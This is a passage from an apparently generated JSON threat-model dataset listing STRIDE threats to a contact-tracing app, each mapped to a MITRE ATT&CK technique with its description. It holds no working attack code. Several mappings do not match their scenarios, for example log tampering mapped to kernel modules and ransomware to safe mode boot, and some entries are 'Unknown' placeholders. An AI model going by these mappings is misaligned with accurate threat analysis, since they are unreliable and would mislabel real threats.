            "Scenario": "An attacker exploits a flaw in the app to gain admin-level access to the central server.",
            "Assumptions": [
                {
                    "Assumption": "There is an exploitable vulnerability in the app.",
                    "Role": "Application",
                    "Condition": "Vulnerability presence"
                },
                {
                    "Assumption": "The central server's admin access is poorly secured.",
                    "Role": "Server",
                    "Condition": "Admin access security"
                },
                {
                    "Assumption": "Attackers have knowledge and capability to exploit vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitation knowledge"
                }
            ],
            "Potential Impact": "Privilege escalation, complete system control compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "admin access",
                "server",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider exploits their existing access to install backdoors on the service server.",
            "Assumptions": [
                {
                    "Assumption": "Insider has sufficient access to modify server configurations.",
                    "Role": "Insider",
                    "Condition": "Access permissions"
                },
                {
                    "Assumption": "No continuous monitoring for unauthorized changes.",
                    "Role": "System",
                    "Condition": "Monitoring gaps"
                },
                {
                    "Assumption": "Failing to verify integrity of server software regularly.",
                    "Role": "Server",
                    "Condition": "Software integrity checks"
                }
            ],
            "Potential Impact": "Privilege escalation, ongoing unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "insider threat",
                "backdoor",
                "server"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a software flaw in the mobile application to gain higher permissions on the user's device.",
            "Assumptions": [
                {
                    "Assumption": "Mobile application contains unpatched vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Software vulnerabilities"
                },
                {
                    "Assumption": "Attackers can remotely exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Remote exploitation"
                },
                {
                    "Assumption": "User device lacks protective measures against privilege escalation.",
                    "Role": "User Device",
                    "Condition": "Protection inadequacies"
                }
            ],
            "Potential Impact": "Privilege escalation, unauthorized control over device.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "mobile application",
                "user device",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake contact tracing application that mimics the legitimate app to trick users into providing their data.",
            "Assumptions": [
                {
                    "Assumption": "Users may be unaware of the official app's appearance and install a fake version.",
                    "Role": "User",
                    "Condition": "Occurs if users get the app from unofficial sources."
                },
                {
                    "Assumption": "Attackers can distribute their fake app through unofficial channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if distribution channels are not properly monitored."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "social engineering",
                "application spoofing",
                "mobile device"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could intercept the Bluetooth communication between devices and inject fake proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not encrypted or uses weak encryption.",
                    "Role": "Attacker",
                    "Condition": "Occurs if proper encryption mechanisms are not implemented."
                },
                {
                    "Assumption": "The attacker is within Bluetooth range of the target devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker is physically close to the targets."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "data injection",
                "network attack",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker with access to the central server in the centralized architecture could impersonate other users or generate fake alerts.",
            "Assumptions": [
                {
                    "Assumption": "The central server's access control mechanisms can be bypassed or exploited.",
                    "Role": "Attacker",
                    "Condition": "Occurs if server vulnerabilities exist."
                },
                {
                    "Assumption": "Attackers can gain unauthorized access to the central server.",
                    "Role": "Attacker",
                    "Condition": "Valid if the server is not fully secured."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "server access",
                "credential theft",
                "identity theft",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile application's code to disable security features and redistribute it.",
            "Assumptions": [
                {
                    "Assumption": "The application's code can be decompiled and altered.",
                    "Role": "Attacker",
                    "Condition": "Occurs if the app is not securely obfuscated."
                },
                {
                    "Assumption": "Users install the tampered application.",
                    "Role": "User",
                    "Condition": "Valid if users trust unofficial sources."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "code tampering",
                "app modification",
                "mobile security",
                "software distribution"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uploads fake rolling keys to the service server in a decentralized architecture, manipulating exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "The server does not validate the authenticity of rolling keys.",
                    "Role": "Service Server",
                    "Condition": "Occurs if key validation protocols are weak or absent."
                },
                {
                    "Assumption": "Attackers can generate or obtain a set of fake rolling keys.",
                    "Role": "Attacker",
                    "Condition": "Valid if the key generation process is not secure."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "key injection",
                "data manipulation",
                "server attack",
                "decentralized system"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker changes logs on the user device to falsify proximity data, affecting exposure assessments.",
            "Assumptions": [
                {
                    "Assumption": "User device logs are not securely stored or encrypted.",
                    "Role": "User Device",
                    "Condition": "Occurs if local data storage is not protected."
                },
                {
                    "Assumption": "Attackers have physical or remote access to the user device.",
                    "Role": "Attacker",
                    "Condition": "Valid if device access controls are weak."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "data falsification",
                "device access",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received exposure notifications despite evidence in the central server logs.",
            "Assumptions": [
                {
                    "Assumption": "Server logs must be accurately timestamped and preserved.",
                    "Role": "Central Server",
                    "Condition": "Occurs if logs are not tamper-proof."
                },
                {
                    "Assumption": "There is no mechanism to ensure user acknowledgement of notifications.",
                    "Role": "Application",
                    "Condition": "Valid if message delivery lacks verification."
                }
            ],
            "Potential Impact": "Operational disruption",
            "MITRE ATT&CK Keywords": [
                "log forgery",
                "denial of service",
                "user repudiation",
                "notification system"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies local device logs to remove evidence of their proximity to other users.",
            "Assumptions": [
                {
                    "Assumption": "Local logs are not tamper-resistant.",
                    "Role": "User Device",
                    "Condition": "Occurs if logs can be altered without detection."
                },
                {
                    "Assumption": "The device owner or attacker has access to the file system.",
                    "Role": "Attacker",
                    "Condition": "Valid if device protection is inadequate."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "file tampering",
                "log manipulation",
                "data integrity",
                "local device"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies uploading their rolling keys after testing positive, challenging the validity of the process.",
            "Assumptions": [
                {
                    "Assumption": "Rolling key uploads must be auditable.",
                    "Role": "Service Server",
                    "Condition": "Occurs if proper audit trails are not maintained."
                },
                {
                    "Assumption": "There is no secure confirmation mechanism for key uploads.",
                    "Role": "User",
                    "Condition": "Valid if upload process lacks verification."
                }
            ],
            "Potential Impact": "Operational disruption",
            "MITRE ATT&CK Keywords": [
                "data denial",
                "upload verification",
                "audit trails",
                "key management"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted Bluetooth communications to collect proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are not encrypted.",
                    "Role": "User Device",
                    "Condition": "Occurs if encryption measures are not implemented."
                },
                {
                    "Assumption": "The attacker has the necessary tools and proximity to intercept Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can be near the target."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "bluetooth interception",
                "wireless communication",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability in the mobile app allows unauthorized access to stored contact and health status data.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app has exploitable vulnerabilities.",
                    "Role": "Mobile Application",
                    "Condition": "Occurs if vulnerabilities are not patched."
                },
                {
                    "Assumption": "Attackers have knowledge of or can discover these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if the app is not frequently updated."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "application vulnerability",
                "data breach",
                "mobile security",
                "health information"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the central server in the centralized architecture and exfiltrates user contact logs and health data.",
            "Assumptions": [
                {
                    "Assumption": "Central server access controls and monitoring are weak.",
                    "Role": "Central Server",
                    "Condition": "Occurs if the server is not properly secured."
                },
                {
                    "Assumption": "Attackers can bypass or exploit server security measures.",
                    "Role": "Attacker",
                    "Condition": "Valid if the server has known vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "server breach",
                "data exfiltration",
                "health information disclosure",
                "central repository"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Firewall",
                "description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
                "id": "attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c",
                "technique_id": "T1562.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with illegitimate requests, overwhelming it and preventing legitimate users from receiving notifications.",
            "Assumptions": [
                {
                    "Assumption": "The central server lacks adequate rate limiting or DDoS protection mechanisms.",
                    "Role": "Central Server",
                    "Condition": "Occurs if rate limiting is not implemented."
                },
                {
                    "Assumption": "Attackers can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if botnets or other means are available."
                }
            ],
            "Potential Impact": "Disruption to system availability",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "network flooding",
                "service disruption",
                "central server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to crash it, preventing users from being alerted to potential exposures.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app contains flaws or errors that could be exploited to cause crashes.",
                    "Role": "Mobile Application",
                    "Condition": "Occurs if the app is inadequately tested."
                },
                {
                    "Assumption": "Attackers have knowledge of an exploit to trigger this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if the vulnerability is publicly known."
                }
            ],
            "Potential Impact": "Disruption to user access",
            "MITRE ATT&CK Keywords": [
                "application crash",
                "mobile exploit",
                "service denial",
                "user disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A ransomware attack targeting the centralized architecture's central server encrypts all data, making it inaccessible until a ransom is paid.",
            "Assumptions": [
                {
                    "Assumption": "The central server lacks comprehensive backup and recovery solutions.",
                    "Role": "Central Server",
                    "Condition": "Occurs if backups are infrequent or non-existent."
                },
                {
                    "Assumption": "Attackers can deploy ransomware onto the central server.",
                    "Role": "Attacker",
                    "Condition": "Valid if the server is compromised through phishing or exploit kits."
                }
            ],
            "Potential Impact": "Disruption to system availability",
            "MITRE ATT&CK Keywords": [
                "ransomware",
                "encryption",
                "data hostage",
                "central server"
            ],
            "mitre_technique": {
                "name": "Safe Mode Boot",
                "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",
                "id": "attack-pattern--28170e17-8384-415c-8486-2e6b294cb803",
                "technique_id": "T1562.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to gain root access to the device, allowing manipulation of app data and functions.",
            "Assumptions": [
                {
